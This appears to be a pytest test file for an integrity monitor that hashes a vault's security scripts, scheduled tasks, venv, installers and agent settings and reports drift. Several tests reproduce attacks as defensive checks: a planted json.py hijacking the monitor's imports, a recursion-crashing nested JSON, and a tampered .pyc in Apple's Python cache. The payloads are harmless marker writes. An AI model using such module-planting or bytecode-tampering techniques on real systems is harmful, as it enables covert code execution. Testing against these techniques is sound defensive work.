def test_a_baseline_from_before_the_normalisation_still_matches(monkeypatch) -> None:
    """Old baselines hold the old hash; an unchanged task must not flood the
    first run after this update with drift to adopt unread."""
    xml = _task_xml(registered="2026-10-05T13:19:02")
    cur = _scan(monkeypatch, xml)
    import hashlib, re as _re
    legacy = _re.sub(r"<Date>.*?</Date>", "", xml)
    baseline = {"vault-lint": {"sha256": hashlib.sha256(legacy.encode()).hexdigest(),
                               "size": len(legacy)}}
    assert im.diff_dir("launchagents", cur, baseline) == []


def test_a_finding_against_a_pre_normalisation_baseline_says_so(monkeypatch) -> None:
    """Every update re-registers the tasks, so a baseline from before the
    normalisation shows each task once; the finding must say why (drift
    review of b5f6e27), not read as a modified task."""
    import hashlib, re as _re
    old_xml = _task_xml(registered="2026-10-05T13:19:02")
    legacy = _re.sub(r"<Date>.*?</Date>", "", old_xml)
    baseline = {"vault-lint": {"sha256": hashlib.sha256(legacy.encode()).hexdigest(),
                               "size": len(legacy)}}
    cur = _scan(monkeypatch, _task_xml(registered="2026-10-11T14:13:13"))
    [f] = im.diff_dir("launchagents", cur, baseline)
    assert f["note"] == ("baseline predates task normalisation (2026-10-12): "
                         "a re-registration alone also shows here, once")
    # Against a current baseline the same re-registration is not a finding.
    assert im.diff_dir("launchagents", cur, _scan(monkeypatch, old_xml)) == []


# ---------------------------------------------------------------------------
# Progress output (Windows tester, 2026-10-12): --update hashed a ~14,690-file
# venv for twelve minutes with nothing printed, so the installer looked hung.
# ---------------------------------------------------------------------------

class TestProgress:
    @pytest.fixture
    def sandbox(self, tmp_path: Path, sample_vault: Path,
                tmp_state_dir: Path) -> list[str]:
        scripts = tmp_path / "scripts"
        (scripts / ".venv" / "lib").mkdir(parents=True)
        (scripts / "alpha.py").write_text("# alpha\n")
        (scripts / ".venv" / "lib" / "mod.py").write_text("x = 1\n")
        agents = tmp_path / "LaunchAgents"
        agents.mkdir()
        return ["--scripts-dir", str(scripts), "--launchagents-dir", str(agents),
                "--vault", str(sample_vault)]

    def test_update_prints_a_progress_line_per_scope(
            self, sandbox: list, silent_notify: list, silent_kickstart: list,
            capsys: pytest.CaptureFixture) -> None:
        assert im.main(sandbox + ["--update"]) == 0
        err = capsys.readouterr().err
        for scope in ("scripts", "launchagents", "venv", "templates",
                      "vault_md_count"):
            assert f"[integrity] scanning {scope} ..." in err, err
            assert re.search(
                rf"\d{{4}}-\d\d-\d\d[ T]\S+ \[integrity\] scanned {scope}: "
                rf"\d+ [a-z/ ]+ in \d+\.\ds", err), err
        assert re.search(r"\[integrity\] scanned venv: 1 files in", err), err

    def test_json_stdout_still_parses_with_progress_on(
            self, sandbox: list, silent_notify: list, silent_kickstart: list,
            capsys: pytest.CaptureFixture, monkeypatch) -> None:
        assert im.main(sandbox + ["--update"]) == 0
        capsys.readouterr()
        monkeypatch.setattr(im, "_isatty", lambda _s: True)   # a person watching
        im.main(sandbox + ["--json"])
        out, err = capsys.readouterr()
        assert json.loads(out)["status"] in ("ok", "drift")
        assert "scanned venv" in err and "scanned venv" not in out

    def test_a_scheduled_check_stays_quiet(
            self, sandbox: list, silent_notify: list, silent_kickstart: list,
            capsys: pytest.CaptureFixture, monkeypatch) -> None:
        assert im.main(sandbox + ["--update"]) == 0
        capsys.readouterr()
        monkeypatch.setattr(im, "_isatty", lambda _s: False)
        im.main(sandbox)
        assert "scanning" not in capsys.readouterr().err


def test_the_task_scan_allows_minutes_not_seconds(monkeypatch) -> None:
    """At 30 seconds every scheduled check on a Windows laptop failed with
    SCAN_FAILED: exporting the tasks took over two minutes (2026-10-13)."""
    seen = {}
    def fake_run(*a, **k):
        seen.update(k)
        return subprocess.CompletedProcess(a[0], 0, b"{}", b"")
    monkeypatch.setattr(im.subprocess, "run", fake_run)
    im.scan_scheduled_tasks()
    assert seen["timeout"] == im.TASK_SCAN_TIMEOUT_SEC >= 300


# ---------------------------------------------------------------------------
# 5278112 / 5278113: the installed, isolated copy; unparseable settings.
# ---------------------------------------------------------------------------

import security_common as sc  # noqa: E402

SCRIPTS = Path(im.__file__).resolve().parent
# The interpreter the agent runs: Apple's 3.9 where it exists, which has no
# -P; this interpreter elsewhere.
CONTROL_PY = "/usr/bin/python3" if Path("/usr/bin/python3").is_file() else sys.executable
# Deep enough for RecursionError on 3.9 (5,000 was the report) and on 3.14.
DEPTH = 200000
DEEP = '{"hooks": ' + "[" * DEPTH + "]" * DEPTH + "}"
PLANT = ("import pathlib\n"
         "pathlib.Path({marker!r}).write_text('planted json.py ran')\n"
         "raise SystemExit('planted json.py ran')\n")


def _vault_scripts(tmp_path: Path) -> Path:
    """A Templates/Scripts holding the control files, as a vault would."""
    scripts = tmp_path / "vault" / "Templates" / "Scripts"
    (scripts / "windows").mkdir(parents=True)
    for rel in sc.CONTROL_FILES + sc.CONTROL_FILES_WINDOWS:
        shutil.copy2(SCRIPTS / rel, scripts / rel)
    return scripts


class TestInstalledCopy:
    def _clean_env(self, tmp_path: Path, state: Path) -> dict:
        env = {k: v for k, v in os.environ.items() if not k.startswith("PYTHON")}
        home = tmp_path / "home"
        home.mkdir(exist_ok=True)
        env.update(HOME=str(home), OBSIDIAN_SECURITY_STATE_DIR=str(state))
        return env

    def test_a_module_planted_in_the_watched_folder_does_not_run_in_the_installed_copy(
            self, tmp_path: Path, allow_subprocess) -> None:
        """The finding's reproduction: a json.py written into Templates/Scripts.
        Run as the old plist ran it (the vault copy, no flags) it executes
        inside the monitor; run as the new plist runs it (the installed copy,
        -I, with the planted folder as cwd) it does not, and it is reported."""
        state = tmp_path / "state"
        scripts = _vault_scripts(tmp_path)
        sc.install_controls(scripts, state / "bin")
        marker = tmp_path / "PLANTED_RAN"
        (scripts / "json.py").write_text(PLANT.format(marker=str(marker)))
        # 5278113, on the interpreter where it crashed every run.
        claude = tmp_path / "home" / ".claude"
        claude.mkdir(parents=True)
        (claude / "settings.json").write_text(DEEP)
        argv = ["--scripts-dir", str(scripts), "--launchagents-dir", str(tmp_path / "agents"),
                "--vault", str(tmp_path / "vault"), "--json"]
        env = self._clean_env(tmp_path, state)

        old = subprocess.run([CONTROL_PY, str(scripts / "integrity_monitor.py"), *argv],
                             cwd=scripts, env=env, capture_output=True, text=True, timeout=300)
        assert marker.read_text() == "planted json.py ran", old.stderr
        marker.unlink()

        new = subprocess.run([CONTROL_PY, "-I", str(state / "bin" / "integrity_monitor.py"), *argv],
                             cwd=scripts, env=env, capture_output=True, text=True, timeout=300)
        assert not marker.exists(), "the planted json.py ran inside the installed copy"
        report = json.loads(new.stdout)
        assert report["status"] == "no_baseline", new.stderr
        assert "json.py" in report["current"]["scripts"]
        assert report["current"]["agent_config"]["home:.claude/settings.json"] == {
            "error": "unreadable: RecursionError"}

    def test_the_plugin_check_runs_isolated_too(self, tmp_path: Path, allow_subprocess) -> None:
        state = tmp_path / "state"
        scripts = _vault_scripts(tmp_path)
        sc.install_controls(scripts, state / "bin")
        marker = tmp_path / "PLANTED_RAN"
        (scripts / "json.py").write_text(PLANT.format(marker=str(marker)))
        r = subprocess.run([CONTROL_PY, "-I", str(state / "bin" / "plugin_integrity_check.py"),
                            "--vault", str(tmp_path / "vault"), "--json"],
                           cwd=scripts, env=self._clean_env(tmp_path, state),
                           capture_output=True, text=True, timeout=120)
        assert not marker.exists()
        assert json.loads(r.stdout)["status"] == "no_baseline", r.stderr

    def test_the_installed_copy_reports_a_vault_copy_that_differs(
            self, tmp_path: Path, tmp_state_dir: Path, monkeypatch) -> None:
        scripts = _vault_scripts(tmp_path)
        sc.install_controls(scripts, tmp_state_dir / "bin")
        monkeypatch.setattr(im, "SELF_DIR", tmp_state_dir / "bin")
        assert im.installed_copy_findings(scripts) == []
        with (scripts / "security_common.py").open("a") as fh:
            fh.write("# edited in the vault\n")
        (scripts / "plugin_integrity_check.py").unlink()
        found = {f["path"]: f for f in im.installed_copy_findings(scripts)}
        assert set(found) == {"security_common.py", "plugin_integrity_check.py"}
        assert found["security_common.py"]["kind"] == "INSTALLED_COPY_MISMATCH"
        assert found["security_common.py"]["detail"] == "contents differ"
        assert found["plugin_integrity_check.py"]["detail"].startswith("vault copy: ")
        assert found["plugin_integrity_check.py"]["vault_sha"] is None

    def test_a_copy_that_is_not_the_installed_one_compares_nothing(
            self, tmp_path: Path, tmp_state_dir: Path, monkeypatch) -> None:
        scripts = _vault_scripts(tmp_path)
        (scripts / "security_common.py").write_text("# different\n")
        monkeypatch.setattr(im, "SELF_DIR", scripts)
        assert im.installed_copy_findings(scripts) == []

    def test_a_mismatch_reaches_the_alert_even_when_the_vault_copy_was_baselined(
            self, tmp_path: Path, sample_vault: Path, tmp_state_dir: Path,
            silent_notify: list, monkeypatch) -> None:
        scripts = _vault_scripts(tmp_path)
        sc.install_controls(scripts, tmp_state_dir / "bin")
        monkeypatch.setattr(im, "SELF_DIR", tmp_state_dir / "bin")
        agents = tmp_path / "agents"
        agents.mkdir()
        argv = ["--scripts-dir", str(scripts), "--launchagents-dir", str(agents),
                "--vault", str(sample_vault)]
        with (scripts / "integrity_monitor.py").open("a") as fh:
            fh.write("# planted\n")
        assert im.main([*argv, "--update"]) == 0
        assert im.main(argv) == 1
        rec = json.loads((tmp_state_dir / "alerts.log").read_text().splitlines()[-1])
        kinds = [(f["kind"], f.get("path")) for f in rec["findings"]]
        assert ("INSTALLED_COPY_MISMATCH", "integrity_monitor.py") in kinds
        assert "installed control integrity_monitor.py differs from the vault's" in silent_notify[-1][1]

    def test_the_controls_find_their_sibling_without_their_folder_first(self) -> None:
        for name in ("integrity_monitor.py", "plugin_integrity_check.py"):
            src = (SCRIPTS / name).read_text(encoding="utf-8")
            head = src[:src.index("\nimport security_common")]
            assert "sys.path.append(" in head and "sys.path.insert(" not in head, name


class TestUnparseableSettings:
    def test_nesting_too_deep_is_unreadable_not_a_crash(self, tmp_path: Path) -> None:
        p = tmp_path / "settings.json"
        p.write_text(DEEP)
        assert im._settings_digest(p) == {"error": "unreadable: RecursionError"}

    def test_it_is_drift_against_a_readable_baseline(
            self, tmp_path: Path, sample_vault: Path, tmp_state_dir: Path,
            silent_notify: list, capsys) -> None:
        scripts, agents = tmp_path / "scripts", tmp_path / "agents"
        scripts.mkdir(); agents.mkdir()
        settings = im.HOME / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text('{"hooks": {}}')
        argv = ["--scripts-dir", str(scripts), "--launchagents-dir", str(agents),
                "--vault", str(sample_vault)]
        assert im.main([*argv, "--update"]) == 0
        settings.write_text(DEEP)
        capsys.readouterr()
        assert im.main([*argv, "--json"]) == 1
        [f] = json.loads(capsys.readouterr().out)["findings"]
        assert f["kind"] == "CONTENT_CHANGE" and f["path"] == "home:.claude/settings.json"

    def test_any_other_failure_is_a_control_error_alert(
            self, tmp_state_dir: Path, silent_notify: list, monkeypatch) -> None:
        def boom(argv):
            raise RecursionError("maximum recursion depth exceeded")
        monkeypatch.setattr(im, "main", boom)
        assert im._main_recording([]) == 3
        rec = json.loads((tmp_state_dir / "alerts.log").read_text().splitlines()[-1])
        assert rec["kind"] == "CONTROL_ERROR" and "RecursionError" in rec["summary"]
        assert silent_notify and silent_notify[-1][1].startswith("CONTROL_ERROR")

    def test_a_state_file_nested_too_deep_is_corrupt_not_a_crash(
            self, tmp_state_dir: Path, capsys) -> None:
        im.STATE_PATH.write_text("[" * DEPTH + "]" * DEPTH)
        with pytest.raises(SystemExit) as exc:
            im.load_state()
        assert exc.value.code == 2
        assert "FATAL: state corrupt: RecursionError" in capsys.readouterr().err


class TestApplePrefixUnderIsolation:
    def test_the_apple_cache_is_checked_when_isolation_hides_the_prefix(
            self, tmp_path: Path, monkeypatch) -> None:
        """Under -I Apple's python reports no pycache_prefix, but every other
        job on it still loads from ~/Library/Caches/com.apple.python."""
        src_dir = tmp_path / "lib"
        src_dir.mkdir()
        src = src_dir / "jsonish.py"
        src.write_text("X = 1\n")
        home = tmp_path / "home"
        prefix = home / "Library" / "Caches" / "com.apple.python"
        pyc = prefix / src_dir.relative_to(src_dir.anchor) / f"jsonish.{sys.implementation.cache_tag}.pyc"
        pyc.parent.mkdir(parents=True)
        py_compile.compile(str(src), cfile=str(pyc), doraise=True)
        pyc.write_bytes(pyc.read_bytes()[:16] + marshal.dumps(compile("X = 2\n", str(src), "exec")))
        monkeypatch.setattr(im, "HOME", home)
        monkeypatch.setattr(sys, "pycache_prefix", None)
        monkeypatch.setattr(im.sys, "platform", "darwin")
        monkeypatch.setattr(im, "_environment_ignored", lambda: False)
        assert im.prefix_cache_findings() == []
        monkeypatch.setattr(im, "_environment_ignored", lambda: True)
        [f] = im.prefix_cache_findings()
        assert f["kind"] == "BYTECODE_MISMATCH" and f["path"] == str(pyc)


class TestBatch2Coverage:
    """Mythos review, batch 2 (2026-10-20): what the scripts scope hashes, and
    the installers scope."""

    @pytest.mark.parametrize("name", [
        "requirements.lock", "requirements-dropper.lock",   # 5278623
        "ffprobe.exe", "claude.cmd", "setup.bat", "more.com", "evil.dll",
        "Helpers.psm1", "x.ps1", "schedules.psd1",           # 5278618
    ])
    def test_each_new_extension_is_flagged_when_planted_or_edited(
            self, tmp_path: Path, name: str) -> None:
        (tmp_path / name).write_bytes(b"v1")
        before = im.scan_dir(tmp_path, exts=im.SCRIPT_EXTS)
        assert name in before
        (tmp_path / name).write_bytes(b"v2")
        after = im.scan_dir(tmp_path, exts=im.SCRIPT_EXTS)
        assert [(f["kind"], f["path"]) for f in im.diff_dir("scripts", after, before)] == [
            ("CONTENT_CHANGE", name)]
        assert [(f["kind"], f["path"]) for f in im.diff_dir("scripts", after, {})] == [
            ("NEW_FILE", name)]

    def test_the_new_extensions_do_not_reach_into_the_venv_or_bytecode_cache(
            self, tmp_path: Path) -> None:
        """Those folders have scopes of their own; the scripts scope prunes them."""
        for rel in (".venv/Scripts/python.exe", ".venv/lib/x.dll",
                    "__pycache__/m.cpython-39.pyc", "windows/run.cmd"):
            (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
            (tmp_path / rel).write_bytes(b"\0")
        assert sorted(im.scan_dir(tmp_path, exts=im.SCRIPT_EXTS)) == ["windows/run.cmd"]

    def test_the_installers_scope_hashes_every_file_and_the_root_entry_points(
            self, tmp_path: Path) -> None:
        for rel in ("installers/components/10-x.sh", "installers/lib/hooks/pre-push",
                    "installers/lib/plugins.sh", "installers/profiles/site.env",
                    "installers/plugin-pins.json", "installers/lib/__pycache__/c.pyc",
                    "install.sh", "update.sh", "uninstall.sh", "README.md"):
            (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
            (tmp_path / rel).write_text(rel)
        got = im.scan_installers(tmp_path)
        assert sorted(got) == [
            "install.sh", "installers/components/10-x.sh", "installers/lib/hooks/pre-push",
            "installers/lib/plugins.sh", "installers/plugin-pins.json",
            "installers/profiles/site.env", "uninstall.sh", "update.sh"]
        assert got["installers/lib/plugins.sh"]["sha256"] == hashlib.sha256(
            b"installers/lib/plugins.sh").hexdigest()

    def test_an_edited_installer_component_is_drift(self, tmp_path: Path) -> None:
        comp = tmp_path / "installers" / "components" / "49-security-controls.sh"
        comp.parent.mkdir(parents=True)
        comp.write_text("v1")
        before = im.scan_installers(tmp_path)
        comp.write_text("v2")
        [f] = im.diff_dir("installers", im.scan_installers(tmp_path), before)
        assert (f["kind"], f["scope"], f["path"]) == (
            "CONTENT_CHANGE", "installers", "installers/components/49-security-controls.sh")

    def test_a_vault_with_no_installers_is_an_empty_scope_not_a_failure(
            self, tmp_path: Path, sample_vault: Path, tmp_state_dir: Path,
            silent_notify: list, capsys: pytest.CaptureFixture) -> None:
        assert not (sample_vault / "installers").exists()
        assert im.scan_installers(sample_vault) == {}
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        agents = tmp_path / "LaunchAgents"
        agents.mkdir()
        argv = ["--scripts-dir", str(scripts), "--launchagents-dir", str(agents),
                "--vault", str(sample_vault)]
        assert im.main([*argv, "--update"]) == 0
        assert json.loads(im.STATE_PATH.read_text())["installers"] == {}
        capsys.readouterr()
        assert im.main([*argv, "--json"]) == 0
        report = json.loads(capsys.readouterr().out)
        assert report["status"] == "ok"
        assert report["current_summary"]["installers"] == 0

    def test_installers_end_to_end_and_not_baselined_once(
            self, tmp_path: Path, sample_vault: Path, tmp_state_dir: Path,
            silent_notify: list, capsys: pytest.CaptureFixture) -> None:
        (sample_vault / "installers" / "lib").mkdir(parents=True)
        (sample_vault / "installers" / "lib" / "common.sh").write_text("v1")
        (sample_vault / "install.sh").write_text("#!/bin/bash\n")
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        agents = tmp_path / "LaunchAgents"
        agents.mkdir()
        argv = ["--scripts-dir", str(scripts), "--launchagents-dir", str(agents),
                "--vault", str(sample_vault)]
        assert im.main([*argv, "--update"]) == 0
        (sample_vault / "installers" / "lib" / "common.sh").write_text("v2 planted")
        capsys.readouterr()
        assert im.main([*argv, "--json"]) == 1
        findings = json.loads(capsys.readouterr().out)["findings"]
        assert [(f["kind"], f["scope"], f["path"]) for f in findings] == [
            ("CONTENT_CHANGE", "installers", "installers/lib/common.sh")]
        # A baseline from before the scope existed: one NOT_BASELINED, not a
        # NEW_FILE per installer file.
        state = json.loads(im.STATE_PATH.read_text())
        state.pop("installers")
        im.STATE_PATH.write_text(json.dumps(state))
        assert im.main([*argv, "--json"]) == 1
        findings = json.loads(capsys.readouterr().out)["findings"]
        assert [(f["kind"], f["scope"], f["count"]) for f in findings] == [
            ("NOT_BASELINED", "installers", 2)]
